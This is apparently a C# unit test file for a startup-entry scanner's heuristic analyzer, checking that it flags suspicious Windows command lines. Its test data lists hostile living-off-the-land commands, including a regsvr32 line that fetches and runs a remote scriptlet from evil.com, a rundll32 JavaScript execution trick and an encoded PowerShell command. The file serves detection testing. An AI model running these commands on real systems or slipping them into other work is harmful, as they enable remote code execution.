using BootSentry.Core.Services;
using Xunit;

namespace BootSentry.Core.Tests.Services;

public class HeuristicAnalyzerTests
{
    private readonly HeuristicAnalyzer _analyzer;

    public HeuristicAnalyzerTests()
    {
        _analyzer = new HeuristicAnalyzer();
    }

    [Theory]
    [InlineData(@"powershell.exe -EncodedCommand ZQBjAGgAbwAgACIAaABhAGMAawBlAGQAIgA=", "PowerShell Encoded Command")]
    [InlineData(@"cmd.exe /c start /min powershell.exe", "Hidden Command Prompt")]
    [InlineData(@"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();", "Rundll32 JavaScript Execution")]
    [InlineData(@"regsvr32.exe /u /n /s /i:http://evil.com/payload.sct scrobj.dll", "Regsvr32 Remote Script")]
    [InlineData(@"wscript.exe /nologo %TEMP%\malware.vbs", "Script in Temp Folder")]
    public void Analyze_ShouldDetectSuspiciousPatterns(string commandLine, string expectedRuleName)
    {
        var matches = _analyzer.Analyze(commandLine);
        Assert.NotEmpty(matches);
        Assert.Contains(matches, m => m.Name == expectedRuleName);
    }

    [Fact]
    public void Analyze_ShouldReturnEmpty_ForSafeCommand()
    {
        var safeCommand = @"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --no-startup-window";
        var matches = _analyzer.Analyze(safeCommand);
        Assert.Empty(matches);
    }
}
